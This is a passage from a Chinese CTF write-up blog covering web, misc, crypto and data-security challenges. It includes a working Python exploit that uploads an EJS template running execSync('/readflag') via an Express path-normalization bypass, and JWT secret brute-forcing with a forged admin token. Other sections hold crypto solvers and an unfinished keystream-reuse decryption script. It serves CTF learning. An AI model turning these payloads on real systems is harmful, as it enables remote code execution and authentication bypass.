req.path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">&#x27;File already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs.writeFile(filePath, Buffer.<span class="keyword">from</span>(req.body.content, <span class="string">&#x27;base64&#x27;</span>), (err) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">&#x27;Error writing file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.status(<span class="number">201</span>).send(<span class="string">&#x27;File created/updated&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Server start</span><br><span class="line">app.listen(PORT, () =&gt; &#123;</span><br><span class="line">    console.log(`Static server <span class="keyword">is</span> running on http://localhost:$&#123;PORT&#125;`);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>2024CISCN</code>决赛<code>web-ezjs</code><strong>修复版</strong>，甚至非预期(<code>.ejs/.../</code>)都给修了，目前的难题在于，如何绕过<code>js$</code>这个正则</p><p>可以通过<code>express</code>的<strong>路径规范化</strong>特性，让<code>/readflag.ejs/.</code>，解析为<code>/readflag.ejs</code>，实现文件上传</p><p>然后就是<strong>模板注入</strong>，这里<code>/flag</code>给的是<strong>400</strong>的权限，但是可以读<code>/readflag</code></p><p>注意了，这里不要使用<code>Python</code>的<code>request</code>的<code>put</code>方法，它会在这一步就帮你<strong>提前路径规范化</strong>了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_put_request</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3000</span>))</span><br><span class="line">    content = <span class="string">&#x27;&lt;%= global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;/readflag\&#x27;).toString() %&gt;&#x27;</span></span><br><span class="line">    encoded_content = base64.b64encode(content.encode()).decode()</span><br><span class="line">    body = <span class="string">f&#x27;&#123;&#123;&quot;content&quot;:&quot;<span class="subst">&#123;encoded_content&#125;</span>&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">f&quot;PUT /readflag.ejs/. HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Host: localhost:3000\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Type: application/json\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Connection: close\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line">    s.send(request.encode())</span><br><span class="line">    response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        response += chunk</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> response.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_get_request</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3000</span>))</span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">&quot;GET /?templ=../readflag.ejs HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: localhost:3000\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    s.send(request.encode())</span><br><span class="line">    response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        response += chunk</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> response.decode()</span><br><span class="line"></span><br><span class="line">put_response = send_put_request()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;PUT请求响应:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(put_response)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">get_response = send_get_request()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET请求响应:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(get_response)</span><br></pre></td></tr></table></figure><h2 id="web6-evil-login"><a href="#web6-evil-login" class="headerlink" title="web6 evil_login*"></a>web6 evil_login*</h2><blockquote><p>can u login?<br>hint: guest/guest1234</p></blockquote><p><strong>jwt伪造</strong>，<code>python jwt_tool.py xxxx -C -d jwt_key.txt</code><br>用字典爆出来<code>admin123</code></p><p>工具：</p><ul><li><a href="https://github.com/ticarpi/jwt_tool">jwt tool</a></li><li><a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">jwt字典</a></li><li><a href="https://www.jwt.io/">加解密jwt</a></li></ul><p>改<code>auth_token</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-M2fBkjjUddPWmGOAcZ9tDfpZBnCWlfrvIkaOQifNYk; </span><br><span class="line">session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV19.aOp9iw.FpTLQhPK5QntjW-gd3PBsbM9Thk</span><br></pre></td></tr></table></figure><p><code>admin</code>了然后呢？这<code>session</code>好像也没什么用，没有下一步的指示了，<code>web</code>也脑洞是吧……</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="别笑，你试你也过不了第二关"><a href="#别笑，你试你也过不了第二关" class="headerlink" title="别笑，你试你也过不了第二关"></a>别笑，你试你也过不了第二关</h2><blockquote><p>来试试闯关拿下flag吧！</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">请编写代码使字符串 hilogo 的内容为以下图案：</span><br><span class="line"></span><br><span class="line"><span class="comment">#####  #####   ###   #      #      ##### ##### ##### #####   ###   #      #      #####</span></span><br><span class="line"><span class="comment">#        #    #   #  #      #      #   # #     #       #    #   #  #      #      #   #</span></span><br><span class="line"><span class="comment">#        #    #####  #      #      #   # #     #       #    #####  #      #      #   #</span></span><br><span class="line"><span class="comment">#        #    #   #  #      #      #   # #     #       #    #   #  #      #      #   #</span></span><br><span class="line"><span class="comment">#####  #####  #   #  #####  #####  ##### ##### ##### #####  #   #  #####  #####  #####</span></span><br></pre></td></tr></table></figure><p>这里应该是<strong>Python沙箱</strong>，那我们用<strong>简单的运算</strong>拼接一下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;#&#x27;</span>*<span class="number">5</span>;d=<span class="string">&#x27;#   #&#x27;</span>;c=a+<span class="string">&#x27; &#x27;</span>;p=c+<span class="string">&#x27; &#x27;</span>+a;l2=<span class="string">&quot;#        #    #   #  #      #      #   # #     #       #    #   #  #      #      #   #&quot;</span>;b=<span class="string">&#x27;   ###   #      #      &#x27;</span>;q=<span class="string">&#x27;  &#x27;</span>+d+<span class="string">&#x27;  &#x27;</span>+a+<span class="string">&#x27;  &#x27;</span>+a;l1=p+b+c*<span class="number">3</span>+a+b+a;l5=p+q+<span class="string">&#x27;  &#x27;</span>+(c*<span class="number">3</span>+a)+q+<span class="string">&#x27;  &#x27;</span>+a;l3=l2.replace(d,a);hilogo=<span class="string">f&#x27;<span class="subst">&#123;l1&#125;</span>\n<span class="subst">&#123;l2&#125;</span>\n<span class="subst">&#123;l3&#125;</span>\n<span class="subst">&#123;l2&#125;</span>\n<span class="subst">&#123;l5&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">请编写 code 以输出前<span class="number">0x114514</span>个数的序数词后缀（小于<span class="number">37</span>长度）:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ordinal</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">10</span> &lt;= n % <span class="number">100</span> &lt;= <span class="number">20</span>:</span><br><span class="line">                suffix = <span class="string">&#x27;th&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                suffix = [<span class="string">&#x27;st&#x27;</span>, <span class="string">&#x27;nd&#x27;</span>, <span class="string">&#x27;rd&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>][n % <span class="number">10</span> - <span class="number">1</span>]</span><br><span class="line">                <span class="keyword">return</span> suffix</span><br><span class="line">                </span><br><span class="line">            test_passed = <span class="literal">True</span></span><br><span class="line">            user_function = <span class="built_in">eval</span>(<span class="string">f&quot;lambda n: <span class="subst">&#123;&lt;span style=<span class="string">&#x27;color: red;&#x27;</span>&gt;code&lt;/span&gt;&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x114514</span>):</span><br><span class="line">    <span class="keyword">if</span> user_function(i) != get_ordinal(i):</span><br><span class="line">        test_passed = <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>第二关没打出来<br>好吧，赛后发现原来是<a href="https://codegolf.stackexchange.com/questions/4707/outputting-ordinal-numbers-1st-2nd-3rd">code golf的例题</a><br><code>&#39;tsnrhtdd&#39;[n%5*(n%100^15&gt;4&gt;n%10)::4]</code></p><h2 id="misc3-成功男人背后的女人"><a href="#misc3-成功男人背后的女人" class="headerlink" title="misc3 成功男人背后的女人"></a>misc3 成功男人背后的女人</h2><blockquote><p>每个成功的男人背后都站着一个伟大的女人。</p></blockquote><p><code>tweakpng</code>看了一下，一开始像<strong>IDAT隐写</strong>，但也发现了大量的<strong>mkBT块</strong>，搜索发现是<strong>Adobe专属</strong>的数据块，下个<a href="https://pan.baidu.com/s/1tkT3geGDKkl2fGCIe8H7MA?pwd=pbn7">firework</a></p><p><img src="https://img1.tucang.cc/api/image/show/9d7ec173482d062e82dad69de8e07adf" alt=""></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>1000100010000010101001101000011</span><br><span class="line"><span class="number">0</span>1010100010001100111101101110111</span><br><span class="line">00110000011011010100010101001110</span><br><span class="line"><span class="number">0</span>1011111011000100110010101101000</span><br><span class="line">00110001011011100100010001011111</span><br><span class="line"><span class="number">0</span>1001101010001010110111001111101</span><br></pre></td></tr></table></figure><p><code>DASCTF&#123;w0mEN_beh1nD_MEn&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="瑞德的一生"><a href="#瑞德的一生" class="headerlink" title="瑞德的一生"></a>瑞德的一生</h2><blockquote><p>瑞德的一生坎坷，你能不能帮帮他</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> legendre</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">x = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">while</span> legendre(x, p) != -<span class="number">1</span> <span class="keyword">or</span> legendre(x, q) != -<span class="number">1</span>:</span><br><span class="line">    x = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg , n, x</span>):</span><br><span class="line">    y = getRandomRange(<span class="number">0</span>, n) </span><br><span class="line">    enc = []</span><br><span class="line">    <span class="keyword">while</span> msg:</span><br><span class="line">        bit = msg &amp; <span class="number">1</span></span><br><span class="line">        msg &gt;&gt;= <span class="number">1</span></span><br><span class="line">        enc.append((<span class="built_in">pow</span>(y, <span class="number">2</span>) * <span class="built_in">pow</span>(x, bit)) % n)</span><br><span class="line">        y += getRandomRange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">    file.write(<span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>\n&quot;</span>)</span><br><span class="line">    file.write(<span class="string">f&quot;enc = <span class="subst">&#123;encrypt(m, n, x)&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>github</code>搜索关键代码<code>enc.append((pow(y, 2) * pow(x, bit)) % n)</code>就是<a href="https://willwam.me/posts/2022-07-29-diceathope-smallfortune">原题</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix(f1.sylvester_matrix(f2, var)).determinant()</span><br><span class="line"></span><br><span class="line">pgcd = <span class="keyword">lambda</span> g1, g2: g1.monic() <span class="keyword">if</span> <span class="keyword">not</span> g2 <span class="keyword">else</span> pgcd(g2, g1%g2)</span><br><span class="line"></span><br><span class="line">P.&lt;y, k&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">p1 = x * y^<span class="number">2</span> - enc[<span class="number">0</span>]</span><br><span class="line">p2 = (y + k)^<span class="number">2</span> - enc[<span class="number">1</span>]</span><br><span class="line">p3 = resultant(p1, p2, y)</span><br><span class="line">k = <span class="built_in">min</span>(p3.univariate_polynomial().monic().small_roots())</span><br><span class="line"></span><br><span class="line">P.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">p1 = x * y^<span class="number">2</span> - enc[<span class="number">0</span>]</span><br><span class="line">p2 = (y + k)^<span class="number">2</span> - enc[<span class="number">1</span>]</span><br><span class="line">p4 = pgcd(p1, p2)</span><br><span class="line">y = n - p4.coefficients()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">P.&lt;k&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> tqdm(enc[::-<span class="number">1</span>]):</span><br><span class="line">    flag &lt;&lt;= <span class="number">1</span></span><br><span class="line">    poly = x * (y+k)^<span class="number">2</span> - c</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(poly.monic().small_roots()):</span><br><span class="line">        flag += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="Ridiculous-LFSR"><a href="#Ridiculous-LFSR" class="headerlink" title="Ridiculous LFSR*"></a>Ridiculous LFSR*</h2><blockquote><p>What? You call this LFSR?</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b&quot;DASCTF&#123;&quot;</span>).strip(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">LENGTH = m.bit_length()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,length</span>):</span><br><span class="line">        self.seed = urandom(<span class="number">32</span>)</span><br><span class="line">        self.length = length</span><br><span class="line">        seed(self.seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> getrandbits(self.length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate</span>(<span class="params">msg,l=<span class="number">1</span></span>):</span><br><span class="line">    temp = <span class="built_in">bin</span>(msg)[<span class="number">2</span>:].zfill(LENGTH)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(temp[l:] + temp[:l],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lfsr = LFSR(LENGTH)</span><br><span class="line">c = []</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    temp = lfsr.<span class="built_in">next</span>()</span><br><span class="line">    c.append(temp ^ m)</span><br><span class="line">    l.append(<span class="built_in">bin</span>(temp)[<span class="number">2</span>:].count(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">    m = rotate(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;LENGTH = &quot;</span> + <span class="built_in">str</span>(LENGTH) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;l = &quot;</span> + <span class="built_in">str</span>(l) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>发现有<code>AI</code>梭哈的<code>wp</code>，<code>ChatGPT-Pro</code>这么吊吗？哈人</p><h1 id="DS-amp-Ai"><a href="#DS-amp-Ai" class="headerlink" title="DS&amp;Ai"></a>DS&amp;Ai</h1><h2 id="DS-amp-Ai1-SM4-OFB"><a href="#DS-amp-Ai1-SM4-OFB" class="headerlink" title="DS&amp;Ai1 SM4-OFB"></a>DS&amp;Ai1 SM4-OFB</h2><blockquote><p>我得到了由某个密钥加密过的部分数据，其中，已知第一条记录的明文为：<br>蒋宏玲         17145949399         220000197309078766<br>你能帮我解密所有数据吗？将”何浩璐”的身份证号的md5值作为flag提交</p></blockquote><p><code>ChatGPT</code>一把梭</p><p><code>SM4-OFB</code> 是流式模式：对每个字段用相同的 <code>IV/密钥</code>从 <code>IV</code> 产生的 <code>keystream</code> 与明文异或得到密文<br>利用已知明文（第一条记录的姓名/手机号/身份证），把对应的密文 <code>XOR</code> 明文 得到三个字段的 <code>keystream</code><br>用得到的 <code>keystream</code> 分别 <code>XOR</code> 所有记录对应字段的密文，得到所有记录的明文</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">decrypt_sm4_ofb_known_plaintext.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">说明：</span></span><br><span class="line"><span class="string">该脚本演示如何在 SM4-OFB（流模式）下，利用已知明文（known-plaintext）恢复 keystream 并解密表格中其它记录。</span></span><br><span class="line"><span class="string">脚本假定每个密文字段以 hex 字符串形式存储，IV 以 hex 存储（同一 IV 或同一密钥下的不同记录可能相同）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出：</span></span><br><span class="line"><span class="string">- 在终端打印目标姓名对应的身份证号与 MD5</span></span><br><span class="line"><span class="string">- 保存一个解密后的 CSV（如果指定 --out）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意：</span></span><br><span class="line"><span class="string">- 该方法**并不需要**知道 SM4 密钥或直接执行 SM4 算法；因为 OFB 模式下密文 = 明文 XOR keystream（流），知道任意明文-密文对可恢复对应位置的 keystream，进而解密其它使用相同 keystream 的密文。</span></span><br><span class="line"><span class="string">- 如果不同列或不同记录使用不同的 keystream（例如不同 IV 或不同密钥），则需要分别用对应的已知明文恢复每个 keystream。本脚本默认第一条记录（--known-row）为已知，并用该记录的姓名/手机号/身份证恢复 3 个 keystream，分别用于解密对应列的所有记录。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># 允许传入 None 或 空字符串</span></span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">str</span>(s).strip()</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 去掉可能的前缀 0x</span></span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&#x27;0X&#x27;</span>):</span><br><span class="line">        s = s[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_keystream_from_pair</span>(<span class="params">cipher_hex, plaintext, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    c = hex_to_bytes(cipher_hex)</span><br><span class="line">    p = plaintext.encode(encoding)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="built_in">len</span>(c):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;已知明文字节长度大于对应密文长度，无法直接派生密钥流&quot;</span>)</span><br><span class="line">    <span class="comment"># 明文在密文长度后补零（假设写入时明文按原始字节长度放入流的开头，后面用零填充）</span></span><br><span class="line">    p_padded = p + <span class="string">b&quot;\x00&quot;</span> * (<span class="built_in">len</span>(c) - <span class="built_in">len</span>(p))</span><br><span class="line">    ks = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(c, p_padded))</span><br><span class="line">    <span class="keyword">return</span> ks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_with_keystream</span>(<span class="params">cipher_hex, ks, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    c = hex_to_bytes(cipher_hex)</span><br><span class="line">    <span class="comment"># 取最短长度的 keystream</span></span><br><span class="line">    n = <span class="built_in">min</span>(<span class="built_in">len</span>(c), <span class="built_in">len</span>(ks))</span><br><span class="line">    pt_bytes = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(c[:n], ks[:n]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = pt_bytes.decode(encoding)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        s = pt_bytes.decode(encoding, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="comment"># 去掉可能的尾部填充和空白</span></span><br><span class="line">    s = s.rstrip(<span class="string">&#x27;\x00&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv=<span class="literal">None</span></span>):</span><br><span class="line">    p = argparse.ArgumentParser()</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--input&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入 Excel/CSV 文件路径（支持 xlsx/xls/csv）&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-row&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">0</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知明文所在行（0-based 索引），默认 0&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-name&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知行的姓名明文&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-phone&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知行的手机号明文&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--known-id&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;已知行的身份证号明文&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--name-col&#x27;</span>, default=<span class="string">&#x27;姓名&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;姓名列名，默认 &quot;姓名&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--phone-col&#x27;</span>, default=<span class="string">&#x27;手机号&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;手机号列名，默认 &quot;手机号&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--id-col&#x27;</span>, default=<span class="string">&#x27;身份证号&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;身份证列名，默认 &quot;身份证号&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--iv-col&#x27;</span>, default=<span class="string">&#x27;IV&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;IV 列名，若无也可不动，默认 &quot;IV&quot;&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--target-name&#x27;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;想要查询并输出 MD5 的目标姓名（例如 &quot;何浩璐&quot;）&#x27;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&#x27;--out&#x27;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&#x27;可选：解密后保存的 CSV 路径&#x27;</span>)</span><br><span class="line">    args = p.parse_args(argv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取文件</span></span><br><span class="line">    <span class="keyword">if</span> args.<span class="built_in">input</span>.lower().endswith(<span class="string">&#x27;.csv&#x27;</span>):</span><br><span class="line">        df = pd.read_csv(args.<span class="built_in">input</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        df = pd.read_excel(args.<span class="built_in">input</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去掉全表空值的一些简单清理</span></span><br><span class="line">    df = df.fillna(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取已知行的三列密文</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c_name = df.at[args.known_row, args.name_col]</span><br><span class="line">        c_phone = df.at[args.known_row, args.phone_col]</span><br><span class="line">        c_id = df.at[args.known_row, args.id_col]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;无法在表中找到指定列或行：&#x27;</span>, e)</span><br><span class="line">        sys.exit(<span 